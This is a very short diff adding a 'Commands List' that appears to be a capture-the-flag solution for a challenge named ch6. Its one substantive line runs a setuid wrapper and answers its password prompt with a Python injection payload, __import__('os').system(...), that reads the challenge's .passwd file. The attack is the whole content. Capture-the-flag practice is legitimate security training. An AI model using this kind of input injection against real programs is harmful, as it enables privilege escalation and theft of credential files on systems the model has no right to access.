@@ -1,0 +1,5 @@
+Commands List
+-------------
+
+./setuid-wrapper 
+Please enter password : __import__("os").system("cat /challenge/app-script/ch6/.passwd")
